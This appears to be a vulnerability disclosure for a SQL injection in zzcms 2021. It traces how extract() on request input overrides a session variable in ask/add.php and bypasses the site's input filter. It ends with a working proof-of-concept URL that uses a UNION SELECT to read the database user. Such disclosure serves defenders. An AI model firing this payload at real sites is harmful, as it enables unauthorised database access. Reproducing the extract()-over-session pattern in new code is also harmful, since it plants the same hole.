+ version: zzcms2021
+ source: http://www.zzcms.net/about/6.htm
+ issue: sql injection

# Position
in `ask/add.php` line 91

![](https://github.com/imkitsch/CVE/blob/main/zzcms/20220217222912.png)

`$_SESSION["bigclassid"]` is an injection point,and `$row["classid"]` is output to the web page 

in `inc/stopsqlin.php`

![](https://github.com/imkitsch/CVE/blob/main/zzcms/20220217224927.png)
function `zc_check` filters `$_GET` and `$_POST`,but it won't affect our injection

![](https://github.com/imkitsch/CVE/blob/main/zzcms/20220217223618.png)
then executes `@extract($_POST);@extract($_GET);`,so we can use the `extract` function to override `$_SESSION["bigclassid"]`

# Poc
`/ask/add.php?_SESSION[bigclassid]=0 union select user(),2,3,4,5,6,7,8,9,10,11--+`

![](https://github.com/imkitsch/CVE/blob/main/zzcms/20220217224442.png)